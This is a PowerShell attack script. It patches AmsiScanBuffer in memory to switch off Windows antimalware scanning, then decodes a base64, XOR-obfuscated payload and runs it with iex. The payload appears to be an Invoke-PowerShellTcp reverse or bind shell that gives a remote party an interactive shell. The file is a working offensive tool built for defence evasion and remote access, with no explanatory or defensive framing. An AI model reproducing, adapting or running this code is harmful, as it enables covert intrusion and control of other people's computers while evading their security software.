
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "d2R/cmV4fn8xWH9nfnp0PEF+ZnRjQnl0fX1FcmExG2oxGy0yGz9CSF9eQUJYQhtfeGJ5cH92MWJyY3hhZTFmeXhyeTFycH8xc3QxZGJ0dTF3fmMxQ3RndGNidDF+YzFTeH91MXh/ZXRjcHJleGd0MUF+ZnRjQnl0fX0xd2N+fDFwMWVwY3Z0ZT8xGxs/VVRCUkNYQUVYXl8bRXl4YjFicmN4YWUxeGIxcHN9dDFlfjFyfn9/dHJlMWV+MXAxYmVwf3VwY3Uxf3RlcnBlMX14YmV0f3h/djF+fzFwMWF+Y2UxZnl0fzFkYnh/djFleXQxPEN0Z3RjYnQxYmZ4ZXJ5PzEbUH1ifj0xcDFiZXB/dXBjdTF/dGVycGUxcnB/MXJ+f390cmUxZX4xZXl4YjFicmN4YWUxU3h/dTFlfjFwMWJhdHJ4d3hyMWF+Y2U/GxtFeXQxYnJjeGFlMXhiMXV0Y3hndHUxd2N+fDFBfmZ0Y3dkfzFmY3hlZXR/MXNoMVN0fzFFZGN/dGMxNzFVcGd0MVlwY3VoGxs/QVBDUFxURVRDMVhBUHV1Y3RiYhtFeXQxWEExcHV1Y3RiYjFlfjFyfn9/dHJlMWV+MWZ5dH8xZGJ4f3YxZXl0MTxDdGd0Y2J0MWJmeGVyeT8bGz9BUENQXFRFVEMxQX5jZRtFeXQxYX5jZTFlfjFyfn9/dHJlMWV+MWZ5dH8xZGJ4f3YxZXl0MTxDdGd0Y2J0MWJmeGVyeT8xRnl0fzFkYnh/djE8U3h/dTF4ZTF4YjFleXQxYX5jZTF+fzFmeXhyeTFleXhiMWJyY3hhZTF9eGJldH9iPxsbP1RJUFxBXVQbQUIxLzFYf2d+enQ8QX5mdGNCeXR9fUVyYTE8Q3RndGNidDE8WEFQdXVjdGJiMSAoIz8gJyk/IyQlPyMjJzE8QX5jZTElJSUlGxtQc35ndDFieX5mYjFwfzF0aXB8YX10MX53MXB/MXh/ZXRjcHJleGd0MUF+ZnRjQnl0fX0xY3RndGNidDFyfn9/dHJlMWJ5dH19PzFQMX90ZXJwZT5hfmZ0Y3JwZTF9eGJldH90YzF8ZGJlMXN0MX14YmV0f3h/djF+fzEbZXl0MXZ4Z3R/MVhBMXB/dTFhfmNlPzEbGz9USVBcQV1UG0FCMS8xWH9nfnp0PEF+ZnRjQnl0fX1FcmExPFN4f3UxPEF+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f3YxZnhleTF0aXRyZGV4fn8xfncxcn58fHB/dTF+fzFleXQxZXBjdnRlPzMxGzExMTExMTExMTExMTExMTFGY3hldDxUY2N+YzE1ThsxMTExMTExMTExMTFsGzExMTExMTExMTExMTVidH91c3ByeiMxMSwxNWJ0f3VzcHJ6MToxNkFCMTYxOjE5VnRlPF1+cnBleH5/OD9BcGV5MToxNi8xNhsxMTExMTExMTExMTE1aTEsMTk1dGNjfmNKIUwxbTFeZGU8QmVjeH92OBsxMTExMTExMTExMTE1dGNjfmM/cn10cGM5OBsxMTExMTExMTExMTE1YnR/dXNwcnojMSwxNWJ0f3VzcHJ6IzE6MTVpGxsxMTExMTExMTExMTEyQ3RlZGN/MWV5dDFjdGJkfWViGzExMTExMTExMTExMTVidH91c2hldDEsMTlKZXRpZT90f3J+dXh/dkwrK1BCUlhYOD9WdGVTaGV0Yjk1YnR/dXNwcnojOBsxMTExMTExMTExMTE1YmVjdHB8P0ZjeGV0OTVidH91c2hldD0hPTVidH91c2hldD9ddH92ZXk4GzExMTExMTExMTExMTViZWN0cHw/V31kYnk5ODExGzExMTExMTExbBsxMTExMTExMTVyfXh0f2U/Un1+YnQ5OBsxMTExMTExMXh3MTk1fXhiZXR/dGM4GzExMTExMTExahsxMTExMTExMTExMTE1fXhiZXR/dGM/QmV+YTk4GzExMTExMTExbBsxMTExbBsxMTExcnBlcnkbMTExMWobMTExMTExMTFGY3hldDxGcGN/eH92MTNCfnx0ZXl4f3YxZnR/ZTFmY35/djAxUnl0cnoxeHcxZXl0MWJ0Y2d0YzF4YjFjdHByeXBzfXQxcH91MWh+ZDFwY3QxZGJ4f3YxZXl0MXJ+Y2N0cmUxYX5jZT8zMRsxMTExMTExMUZjeGV0PFRjY35jMTVOGzExMTFsG2wbGw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))

